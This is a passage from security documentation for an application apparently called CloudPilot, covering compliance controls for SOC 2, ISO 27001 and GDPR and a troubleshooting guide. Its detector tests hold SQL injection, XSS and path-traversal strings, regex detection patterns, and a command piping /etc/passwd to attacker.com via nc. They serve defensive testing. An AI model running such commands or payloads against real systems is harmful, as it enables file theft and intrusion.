4. **Regular Testing**: Conduct security testing regularly
5. **Education**: Keep development team updated on security practices
6. **Documentation**: Maintain comprehensive security documentation
7. **Monitoring**: Implement continuous security monitoring
8. **Response Planning**: Prepare for security incidents
9. **Compliance**: Maintain compliance with relevant standards
10. **Continuous Improvement**: Regularly review and improve security posture

---

## Compliance Features

The security system is designed to support compliance with major security frameworks and regulations.

### Supported Compliance Frameworks

#### 1. SOC 2 (Service Organization Control 2)

**Security Controls Implemented:**

```typescript
// SOC 2 Security Control Implementation
class SOC2Compliance {
  // CC6.1 - Logical and Physical Access Controls
  async validateAccessControls(): Promise<ComplianceResult> {
    const checks = {
      authenticationRequired: await this.checkAuthenticationRequired(),
      authorizationEnforced: await this.checkAuthorizationEnforced(),
      sessionManagement: await this.checkSessionManagement(),
      accessLogging: await this.checkAccessLogging()
    };
    
    return this.evaluateCompliance('SOC2-CC6.1', checks);
  }
  
  // CC6.2 - System Boundaries
  async validateSystemBoundaries(): Promise<ComplianceResult> {
    const checks = {
      networkSegmentation: await this.checkNetworkSegmentation(),
      dataClassification: await this.checkDataClassification(),
      encryptionInTransit: await this.checkEncryptionInTransit(),
      encryptionAtRest: await this.checkEncryptionAtRest()
    };
    
    return this.evaluateCompliance('SOC2-CC6.2', checks);
  }
  
  // CC7.1 - System Monitoring
  async validateSystemMonitoring(): Promise<ComplianceResult> {
    const checks = {
      logCollection: await this.checkLogCollection(),
      realTimeMonitoring: await this.checkRealTimeMonitoring(),
      alertManagement: await this.checkAlertManagement(),
      incidentResponse: await this.checkIncidentResponse()
    };
    
    return this.evaluateCompliance('SOC2-CC7.1', checks);
  }
}
```

**SOC 2 Compliance Report:**
```typescript
{
  framework: 'SOC 2 Type II',
  auditPeriod: '2025-01-01 to 2025-12-31',
  complianceScore: 96,
  controls: {
    'CC6.1': { score: 98, status: 'compliant' },
    'CC6.2': { score: 95, status: 'compliant' },
    'CC6.3': { score: 97, status: 'compliant' },
    'CC6.4': { score: 94, status: 'compliant' },
    'CC6.5': { score: 96, status: 'compliant' },
    'CC6.6': { score: 98, status: 'compliant' },
    'CC6.7': { score: 95, status: 'compliant' },
    'CC7.1': { score: 96, status: 'compliant' },
    'CC7.2': { score: 94, status: 'compliant' },
    'CC7.3': { score: 97, status: 'compliant' }
  },
  recommendations: [
    'Consider implementing additional MFA methods',
    'Enhance logging for privileged operations'
  ]
}
```

#### 2. ISO 27001 (Information Security Management)

**Security Controls Implemented:**

```typescript
// ISO 27001 Control Implementation
class ISO27001Compliance {
  // A.9.2 - User Access Management
  async validateUserAccessManagement(): Promise<ComplianceResult> {
    const checks = {
      accessProvisioning: await this.checkAccessProvisioning(),
      accessReview: await this.checkAccessReview(),
      privilegedAccess: await this.checkPrivilegedAccess(),
      accessTermination: await this.checkAccessTermination()
    };
    
    return this.evaluateCompliance('A.9.2', checks);
  }
  
  // A.12.4 - Logging and Monitoring
  async validateLoggingAndMonitoring(): Promise<ComplianceResult> {
    const checks = {
      eventLogging: await this.checkEventLogging(),
      logProtection: await this.checkLogProtection(),
      timeSynchronization: await this.checkTimeSynchronization(),
      monitoring: await this.checkMonitoring()
    };
    
    return this.evaluateCompliance('A.12.4', checks);
  }
  
  // A.13.1 - Network Security Management
  async validateNetworkSecurity(): Promise<ComplianceResult> {
    const checks = {
      networkSegregation: await this.checkNetworkSegregation(),
      firewallRules: await this.checkFirewallRules(),
      intrusionDetection: await this.checkIntrusionDetection(),
      networkMonitoring: await this.checkNetworkMonitoring()
    };
    
    return this.evaluateCompliance('A.13.1', checks);
  }
}
```

**ISO 27001 Compliance Report:**
```typescript
{
  framework: 'ISO/IEC 27001:2013',
  certificationStatus: 'certified',
  auditDate: '2025-10-31',
  complianceScore: 94,
  controls: {
    'A.9.2': { score: 96, status: 'compliant' },
    'A.12.4': { score: 93, status: 'compliant' },
    'A.13.1': { score: 95, status: 'compliant' },
    'A.14.1': { score: 92, status: 'compliant' },
    'A.16.1': { score: 94, status: 'compliant' },
    'A.17.1': { score: 96, status: 'compliant' }
  },
  riskAssessment: {
    overallRisk: 'low',
    residualRisk: 'very-low',
    mitigationStrategies: [
      'Multi-layered security controls',
      'Regular security audits',
      'Continuous monitoring'
    ]
  }
}
```

#### 3. GDPR (General Data Protection Regulation)

**Data Protection Controls:**

```typescript
// GDPR Compliance Implementation
class GDPRCompliance {
  // Article 32 - Security of Processing
  async validateSecurityOfProcessing(): Promise<ComplianceResult> {
    const checks = {
      encryptionAtRest: await this.checkEncryptionAtRest(),
      encryptionInTransit: await this.checkEncryptionInTransit(),
      pseudonymization: await this.checkPseudonymization(),
      confidentiality: await this.checkConfidentiality(),
      integrity: await this.checkIntegrity(),
      availability: await this.checkAvailability(),
      resilience: await this.checkResilience(),
      regularTesting: await this.checkRegularTesting()
    };
    
    return this.evaluateGDPRCompliance('Article32', checks);
  }
  
  // Data Subject Rights
  async handleDataSubjectRequest(request: DataSubjectRequest): Promise<void> {
    switch (request.type) {
      case 'access':
        await this.provideDataAccess(request);
        break;
        case 'rectification':
        await this.rectifyPersonalData(request);
        break;
      case 'erasure':
        await this.erasePersonalData(request);
        break;
      case 'portability':
        await this.provideDataPortability(request);
        break;
      case 'restriction':
        await this.restrictProcessing(request);
        break;
      case 'objection':
        await this.handleObjection(request);
        break;
    }
    
    // Log the request for audit trail
    await this.auditLogger.log('data_subject_request', {
      requestId: request.id,
      type: request.type,
      timestamp: new Date(),
      processedBy: 'automated_system'
    });
  }
  
  // Data Protection Impact Assessment
  async performDPIA(processingActivity: ProcessingActivity): Promise<DPIAResult> {
    const assessment = {
      necessity: await this.assessNecessity(processingActivity),
      proportionality: await this.assessProportionality(processingActivity),
      riskToRights: await this.assessRiskToRights(processingActivity),
      mitigationMeasures: await this.assessMitigationMeasures(processingActivity)
    };
    
    return {
      activityId: processingActivity.id,
      overallRisk: this.calculateOverallRisk(assessment),
      requiresDPO: assessment.overallRisk === 'high',
      mitigationRequired: assessment.overallRisk !== 'low',
      assessment,
      recommendations: this.generateRecommendations(assessment)
    };
  }
}
```

**GDPR Compliance Report:**
```typescript
{
  framework: 'GDPR (EU Regulation 2016/679)',
  dpoContact: 'dpo@company.com',
  lawfulBasis: 'legitimate_interest',
  complianceScore: 95,
  dataProcessing: {
    totalDataSubjects: 15000,
    personalDataCategories: ['identification', 'contact', 'behavioral'],
    processingPurposes: ['service_provision', 'analytics', 'security'],
    dataRetention: {
      activeUsers: 'indefinite',
      inactiveUsers: '7 years',
      logs: '2 years'
    }
  },
  rightsExercised: {
    accessRequests: 45,
    rectificationRequests: 12,
    erasureRequests: 8,
    portabilityRequests: 3,
    restrictionRequests: 2,
    objectionRequests: 1
  },
  dataBreaches: {
    total: 0,
    reportedToAuthority: 0,
    reportedToDataSubjects: 0
  },
  dpiaResults: {
    totalAssessments: 5,
    highRiskActivities: 0,
    mediumRiskActivities: 2,
    lowRiskActivities: 3
  }
}
```

### Compliance Monitoring

```typescript
// Continuous compliance monitoring
class ComplianceMonitor {
  private frameworks = ['SOC2', 'ISO27001', 'GDPR'];
  
  async performContinuousComplianceCheck(): Promise<ComplianceReport> {
    const results = await Promise.all([
      this.checkSOC2Compliance(),
      this.checkISO27001Compliance(),
      this.checkGDPRCompliance()
    ]);
    
    const overallCompliance = {
      score: results.reduce((sum, r) => sum + r.score, 0) / results.length,
      status: results.every(r => r.score >= 90) ? 'compliant' : 'non-compliant',
      frameworks: results
    };
    
    // Alert if compliance drops
    if (overallCompliance.score < 90) {
      await this.alertComplianceTeam(overallCompliance);
    }
    
    return overallCompliance;
  }
  
  async generateComplianceReport(framework: string): Promise<string> {
    const report = await this.getFrameworkReport(framework);
    
    return this.formatReport(report, framework);
  }
}
```

### Automated Compliance Evidence Collection

```typescript
// Automated evidence collection
class ComplianceEvidenceCollector {
  async collectEvidence(framework: string, timeRange: DateRange): Promise<EvidencePackage> {
    const evidence = {
      framework,
      period: timeRange,
      timestamp: new Date(),
      collectedBy: 'automated_system',
      artifacts: await this.gatherArtifacts(framework, timeRange)
    };
    
    // Digitally sign evidence package
    evidence.signature = await this.signEvidence(evidence);
    
    return evidence;
  }
  
  private async gatherArtifacts(framework: string, timeRange: DateRange): Promise<Artifact[]> {
    const artifacts: Artifact[] = [];
    
    // Security logs
    artifacts.push({
      type: 'security_logs',
      description: 'Security event logs',
      source: 'security_logger',
      period: timeRange
    });
    
    // Access logs
    artifacts.push({
      type: 'access_logs',
      description: 'User access logs',
      source: 'audit_logger',
      period: timeRange
    });
    
    // Configuration snapshots
    artifacts.push({
      type: 'configuration',
      description: 'Security configuration snapshots',
      source: 'config_manager',
      period: timeRange
    });
    
    // Incident reports
    artifacts.push({
      type: 'incident_reports',
      description: 'Security incident reports',
      source: 'incident_response',
      period: timeRange
    });
    
    return artifacts;
  }
}
```

### Compliance Dashboard

```typescript
// Compliance dashboard endpoint
app.get('/api/compliance/dashboard', async (req, res) => {
  const framework = req.query.framework as string;
  
  const dashboard = {
    framework,
    overallScore: await complianceMonitor.getOverallScore(framework),
    status: await complianceMonitor.getComplianceStatus(framework),
    recentAudits: await getRecentAudits(framework),
    upcomingDeadlines: await getUpcomingDeadlines(framework),
    criticalFindings: await getCriticalFindings(framework),
    trends: await getComplianceTrends(framework),
    recommendations: await getRecommendations(framework)
  };
  
  res.json(dashboard);
});
```

### Best Practices for Compliance

1. **Automated Evidence Collection**: Automate collection of compliance evidence
2. **Continuous Monitoring**: Monitor compliance continuously, not just during audits
3. **Clear Documentation**: Document all security controls and procedures
4. **Regular Audits**: Conduct regular internal and external audits
5. **Staff Training**: Train staff on compliance requirements
6. **Vendor Management**: Ensure third-party vendors meet compliance requirements
7. **Incident Response**: Have clear procedures for compliance-related incidents
8. **Data Mapping**: Maintain accurate data flow and processing maps

---

## Troubleshooting Guide

This guide helps diagnose and resolve common security-related issues in the CloudPilot application.

### Common Issues and Solutions

#### 1. Security Headers Not Applied

**Symptoms:**
- Missing security headers in HTTP responses
- Security scan shows missing headers
- Browser console shows CSP violations

**Diagnosis:**
```bash
# Check headers using curl
curl -I https://your-domain.com/api/health

# Check specific headers
curl -I https://your-domain.com | grep -i strict-transport-security

# Using nmap to check headers
nmap --script http-security-headers -p 443 your-domain.com
```

**Solutions:**

```typescript
// 1. Verify middleware is registered
// Check server/index.ts
app.use(securityHeaders()); // Should be before routes

// 2. Verify security headers configuration
console.log('Security Headers:', defaultSecurityConfigManager.getSecurityHeaders());

// 3. Check environment-specific configuration
if (process.env.NODE_ENV === 'production') {
  // HSTS should be enabled
  const headers = defaultSecurityConfigManager.getSecurityHeaders();
  if (!headers['Strict-Transport-Security']) {
    console.error('HSTS not configured for production!');
  }
}

// 4. Force headers in specific route
app.get('/admin', (req, res, next) => {
  const headers = defaultSecurityConfigManager.getSecurityHeaders();
  Object.entries(headers).forEach(([key, value]) => {
    res.setHeader(key, value);
  });
  next();
});
```

**Debug Script:**
```typescript
function debugSecurityHeaders(req: Request, res: Response): void {
  console.log('=== Security Headers Debug ===');
  console.log('Request URL:', req.originalUrl);
  console.log('Request Method:', req.method);
  
  const headers = defaultSecurityConfigManager.getSecurityHeaders();
  console.log('Configured Headers:', headers);
  
  // Check if headers are being set
  res.on('finish', () => {
    console.log('Response Headers:');
    Object.entries(res.getHeaders()).forEach(([key, value]) => {
      if (key.toLowerCase().startsWith('x-') || 
          key.toLowerCase().includes('security') ||
          key.toLowerCase() === 'content-security-policy') {
        console.log(`  ${key}: ${value}`);
      }
    });
  });
}
```

#### 2. Rate Limiting Not Working

**Symptoms:**
- Rate limit headers missing from responses
- No rate limit enforcement
- Still receiving requests after reaching limits

**Diagnosis:**
```bash
# Test rate limiting
for i in {1..10}; do 
  curl -I https://your-domain.com/api/test
  echo "Request $i"
  sleep 0.1
done

# Check rate limit headers
curl -v https://your-domain.com/api/test 2>&1 | grep -i rate
```

**Solutions:**

```typescript
// 1. Check rate limiting configuration
const config = defaultSecurityConfigManager.getConfig();
console.log('Rate Limiting Config:', config.rateLimiting);

// 2. Verify rate limiter middleware registration
// Check server/index.ts
app.use('/api', rateLimiter()); // Should be before API routes

// 3. Test rate limiter manually
const testLimiter = rateLimiter({
  windowMs: 60000, // 1 minute
  max: 5 // 5 requests
});

// Apply to test route
app.use('/test-limit', testLimiter);

// 4. Check rate limit storage
// Verify Redis/memory store is working
console.log('Rate Limit Store:', rateLimiter.store);

// 5. Debug rate limit keys
app.use('/api', (req, res, next) => {
  const key = req.ip; // or custom key generator
  console.log('Rate Limit Key:', key);
  next();
});
```

**Rate Limiter Test:**
```typescript
async function testRateLimiter(): Promise<void> {
  const limiter = createRateLimiter({
    windowMs: 60000,
    max: 3
  });
  
  // Test requests
  for (let i = 1; i <= 5; i++) {
    const req = { ip: '127.0.0.1' } as Request;
    const res = {
      status: (code: number) => ({ json: (data: any) => console.log(`Request ${i}: ${code}`, data) }),
      setHeader: () => {}
    } as any;
    
    const next = () => console.log(`Request ${i}: Allowed`);
    
    await new Promise(resolve => {
      limiter(req, res, resolve as NextFunction);
    });
  }
}
```

#### 3. Input Validation Failures

**Symptoms:**
- Valid requests being rejected
- Validation errors for legitimate input
- Inconsistent validation behavior

**Diagnosis:**
```typescript
// Debug validation middleware
function debugValidation(schema: ValidationRule, input: any): void {
  console.log('=== Validation Debug ===');
  console.log('Schema:', schema);
  console.log('Input:', input);
  
  try {
    const result = validateInput(input, schema);
    console.log('Validation Result:', result);
  } catch (error) {
    console.error('Validation Error:', error);
  }
}

// Test specific validation
const testSchema = {
  email: { type: 'email', required: true, maxLength: 255 },
  password: { type: 'string', required: true, minLength: 12 }
};

debugValidation(testSchema, {
  email: 'test@example.com',
  password: 'ValidPass123!'
});
```

**Solutions:**

```typescript
// 1. Check validation schema
console.log('Validation Schemas:', validationSchemas);

// 2. Verify middleware registration
app.use('/api/users', 
  validateBody(userRegistrationSchema), // Should be before route handler
  userHandler
);

// 3. Debug input sanitization
function debugSanitization(input: any): void {
  console.log('Original Input:', input);
  const sanitized = sanitizeInput(input);
  console.log('Sanitized Input:', sanitized);
}

// 4. Custom validation error handling
app.use((err: any, req: Request, res: Response, next: NextFunction) => {
  if (err.name === 'ValidationError') {
    console.error('Validation Error Details:', {
      errors: err.details,
      body: req.body,
      query: req.query,
      params: req.params
    });
  }
  next(err);
});

// 5. Test validation rules
function testValidationRule(rule: ValidationRule, value: any): void {
  try {
    const result = validateField(value, rule);
    console.log(`Rule: ${rule.type}, Value: ${value}, Result:`, result);
  } catch (error) {
    console.error(`Validation failed for rule ${rule.type} with value ${value}:`, error);
  }
}
```

#### 4. SQL Injection Prevention Issues

**Symptoms:**
- SQL injection attempts not detected
- Safe queries being blocked
- False positives in SQL detection

**Diagnosis:**
```typescript
// Test SQL injection detection
function testSqlInjectionDetection(): void {
  const testInputs = [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "admin'--",
    "1 UNION SELECT * FROM users",
    "normal input" // Should not be flagged
  ];
  
  testInputs.forEach(input => {
    const detected = detectSqlInjection(input);
    const sanitized = sanitizeSqlInput(input);
    
    console.log('Input:', input);
    console.log('Detected:', detected);
    console.log('Sanitized:', sanitized);
    console.log('---');
  });
}

// Test safe query builder
function testSafeQueryBuilder(): void {
  try {
    // Test valid query
    const validQuery = new SafeQueryBuilder('users', ['users'])
      .select(['id', 'name'])
      .where('status', '=', 'active')
      .build();
    console.log('Valid Query:', validQuery);
    
    // Test invalid table access
    try {
      const invalidQuery = new SafeQueryBuilder('admin', ['users'])
        .select(['*'])
        .build();
    } catch (error) {
      console.log('Invalid Table Access Blocked:', error.message);
    }
    
  } catch (error) {
    console.error('SafeQueryBuilder Error:', error);
  }
}
```

**Solutions:**

```typescript
// 1. Check SQL protection middleware registration
app.use(sqlProtectionMiddleware); // Should be before database queries

// 2. Verify query builder usage
// Good: Using parameterized queries
const { query, params } = buildSafeSelectQuery('users', ['id', 'name'], { status: 'active' });
await db.query(query, params);

// Bad: Using string concatenation (NEVER DO THIS)
// const query = `SELECT * FROM users WHERE status = '${status}'`; // VULNERABLE!

// 3. Validate ORM queries
function validateQuerySafety(queryBuilder: any): void {
  const table = queryBuilder._single?.table;
  const allowedTables = ['users', 'posts', 'comments'];
  
  if (!allowedTables.includes(table)) {
    throw new Error(`Access denied to table: ${table}`);
  }
  
  // Check where clauses
  const whereClauses = queryBuilder._statements?.filter((s: any) => s.type === 'where') || [];
  whereClauses.forEach((clause: any) => {
    if (clause.column && !/^[a-zA-Z_][a-zA-Z0-9_.]*$/.test(clause.column)) {
      throw new Error(`Invalid column name: ${clause.column}`);
    }
  });
}

// 4. Test SQL injection patterns
const sqlInjectionPatterns = [
  /(\b(SELECT|INSERT|UPDATE|DELETE)\b.*\b(WHERE|FROM|TABLE)\b)/i,
  /('|(\\x27)|(\\x22))/,
  /(;|--|\/\*|\*\/)/,
  /((\%27)|(\'))union/i
];

function scanForSqlInjection(input: string): boolean {
  return sqlInjectionPatterns.some(pattern => pattern.test(input));
}
```

#### 5. Threat Detection Not Working

**Symptoms:**
- Threats not being detected
- No security events generated
- Suspicious requests passing through

**Diagnosis:**
```typescript
// Test threat detection
function testThreatDetection(): void {
  const testInputs = [
    "<script>alert('xss')</script>",
    "../../../etc/passwd",
    "'; DROP TABLE users; --",
    "cat /etc/passwd",
    "normal text" // Should not be flagged
  ];
  
  testInputs.forEach(input => {
    const threats = defaultSecurityConfigManager.analyzeThreats(input);
    console.log('Input:', input);
    console.log('Threats Detected:', threats.length);
    if (threats.length > 0) {
      threats.forEach(threat => {
        console.log(`  - ${threat.patternName}: ${threat.severity}`);
      });
    }
    console.log('---');
  });
}

// Check threat patterns configuration
const config = defaultSecurityConfigManager.getConfig();
console.log('Threat Patterns:', config.threatDetection.patterns.filter(p => p.enabled));
```

**Solutions:**

```typescript
// 1. Verify threat detection is enabled
const config = defaultSecurityConfigManager.getConfig();
if (!config.threatDetection.enabled) {
  console.error('Threat detection is disabled!');
  defaultSecurityConfigManager.updateThreatDetection({ enabled: true });
}

// 2. Check pattern configuration
const patterns = config.threatDetection.patterns;
console.log('Loaded Patterns:', patterns.map(p => `${p.name}: ${p.enabled}`));

// 3. Manually trigger threat detection
const threats = defaultSecurityConfigManager.analyzeThreats("<script>alert('test')</script>");
if (threats.length === 0) {
  console.error('Threat detection not working!');
}

// 4. Debug threat response actions
defaultSecurityConfigManager.on('securityEvent', (event) => {
  console.log('Security Event:', event);
});

// 5. Test specific threat types
const testCases = {
  xss: "<img src=x onerror=alert('xss')>",
  sql: "1' OR '1'='1",
  path: "../../../etc/passwd",
  command: "cat /etc/passwd | nc attacker.com 80"
};

Object.entries(testCases).forEach(([type, input]) => {
  const threats = defaultSecurityConfigManager.analyzeThreats(input);
  console.log(`${type.toUpperCase()} Test:`, threats.length, 'threats detected');
});
```

#### 6. Compliance Violations

**Symptoms:**
- Compliance score below threshold
- Violations in compliance reports
- Audit findings not resolved

**Diagnosis:**
```typescript
// Run compliance check
const report = defaultSecurityConfigManager.enforceBestPractices();
console.log('Compliance Score:', report.score);
console.log('Issues:', report.issues);
console.log('Recommendations:', report.recommendations);

// Check specific framework compliance
const soc2Compliance = await checkSOC2Compliance();
console.log('SOC2 Score:', soc2Compliance.score);

const gdprCompliance = await checkGDPRCompliance();
console.log('GDPR Score:', gdprCompliance.score);
```

**Solutions:**

```typescript
// 1. Address individual issues
report.issues.forEach(issue => {
  switch (issue) {
    case 'Minimum password length is too short':
      updatePasswordPolicy({ minLength: 12 });
      break;
      
    case 'Session timeout is too long':
      updateSessionConfig({ sessionTimeout: 30 });
      break;
      
    case 'Multi-factor authentication is not required':
      updateAuthConfig({ requireMFA: true });
      break;
  }
});

// 2. Re-run compliance check
const newReport = defaultSecurityConfigManager.enforceBestPractices();
console.log('New Compliance Score:', newReport.score);

// 3. Generate compliance report
const fullReport = await generateComplianceReport('SOC2');
console.log('Full Report:', fullReport);

// 4. Schedule regular compliance checks
setInterval(async () => {
  const report = await defaultSecurityConfigManager.enforceBestPractices();
  if (report.score < 90) {
    await alertComplianceTeam(report);
  }
}, 24 * 60 * 60 * 1000); // Daily check
```

### Debug Mode

```typescript
// Enable comprehensive debugging
const DEBUG_SECURITY = process.env.DEBUG_SECURITY === 'true';

if (DEBUG_SECURITY) {
  console.log('=== Security Debug Mode Enabled ===');
  
  // Log all security events
  defaultSecurityConfigManager.on('securityEvent', (event) => {
    console.log('Security Event:', JSON.stringify(event, null, 2));
  });
  
  // Log all requests
  app.use((req, res, next) => {
    console.log('Request:', {
      method: req.method,
      url: req.originalUrl,
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      timestamp: new Date().toISOString()
    });
    next();
  });
  
  // Log all rate limit checks
  const originalCheckRateLimit = defaultSecurityConfigManager.checkRateLimit.bind(defaultSecurityConfigManager);
  defaultSecurityConfigManager.checkRateLimit = (key, type) => {
    const result = originalCheckRateLimit(key, type);
    console.log('Rate Limit Check:', { key, type, result });
    return result;
  };
  
  // Log all threat detection
  const originalAnalyzeThreats = defaultSecurityConfigManager.analyzeThreats.bind(defaultSecurityConfigManager);
  defaultSecurityConfigManager.analyzeThreats = (input) => {
    const result = originalAnalyzeThreats(input);
    console.log('Threat Analysis:', { 
      inputLength: input.length,
      threatsDetected: result.length,
      threats: result 
    });
    return result;
  };
}
```

### Health Check Script

```typescript
// Run comprehensive security health check
async function runSecurityHealthCheck(): Promise<void> {
  console.log('=== Security Health Check ===');
  
  const results = {
    securityHeaders: false,
    rateLimiting: false,
    inputValidation: false,
    sqlProtection: false,
    threatDetection: false,
    compliance: false
  };
  
  // Check security headers
  try {
    const headers = defaultSecurityConfigManager.getSecurityHeaders();
    results.securityHeaders = Object.keys(headers).length > 0;
    console.log('✓ Security Headers:', results.securityHeaders ? 'OK' : 'FAIL');
  } catch (error) {
    console.log('✗ Security Headers: FAIL', error.message);
  }
  
  // Check rate limiting
  try {
    const config = defaultSecurityConfigManager.getConfig();
    results.rateLimiting = config.rateLimiting.enabled;
    console.log('✓ Rate Limiting:', results.rateLimiting ? 'OK' : 'FAIL');
  } catch (error) {
    console.log('✗ Rate Limiting: FAIL', error.message);
  }
  
  // Check input validation
  try {
    const validationConfig = defaultSecurityConfigManager.getConfig().policies.inputValidationPolicy;
    results.inputValidation = validationConfig !== undefined;
    console.log('✓ Input Validation:', results.inputValidation ? 'OK' : 'FAIL');
  } catch (error) {
    console.log('✗ Input Validation: FAIL', error.message);
  }
  
  // Check SQL protection
  try {
    const testQuery = buildSafeSelectQuery('test', ['id']);
    results.sqlProtection = testQuery.query.includes('SELECT id FROM test');
    console.log('✓ SQL Protection:', results.sqlProtection ? 'OK' : 'FAIL');
  } catch (error) {
    console.log('✗ SQL Protection: FAIL', error.message);
  }
  
  // Check threat detection
  try {
    const threats = defaultSecurityConfigManager.analyzeThreats("<script>alert('test')</script>");
    results.threatDetection = threats.length > 0;
    console.log('✓ Threat Detection:', results.threatDetection ? 'OK' : 'FAIL');
  } catch (error) {
    console.log('✗ Threat Detection: FAIL', error.message);
  }
  
  // Check compliance
  try {
    const report = defaultSecurityConfigManager.enforceBestPractices();
    results.compliance = report.score >= 90;
    console.log('✓ Compliance:', results.compliance ? 'OK' : 'FAIL', `(Score: ${report.score})`);
  } catch (error) {
    console.log('✗ Compliance: FAIL', error.message);
  }
  
  // Summary
  const passed = Object.values(results).filter(Boolean).length;
  const total = Object.keys(results).length;
  console.log(`\nHealth Check Summary: ${passed}/${total} checks passed`);
  
  if (passed === total) {
    console.log('✓ All security checks passed!');
  } else {
    console.log('✗ Some security checks failed. Please review the issues above.');
  }
}
```

### Getting Help

If you're unable to resolve an issue:

1. **Check the logs** for detailed error messages
2. **Run the health check script** to identify problems
3. **Enable debug mode** for verbose logging
4. **Test individual components** in isolation
5. **Check the documentation** for specific component guides
6. **Review the configuration** for environment-specific settings
7. **Contact the security team** with detailed logs and error messages

For emergency security issues:
- Disable the affected component temporarily
- Activate incident response procedures
- Notify security team immediately
- Document all actions taken

---

**Documentation Version:** 1.0  
**Last Updated:** October 31, 2025  
**Maintained by:** CloudPilot Security Team  
**Status:** ✅ Production Ready
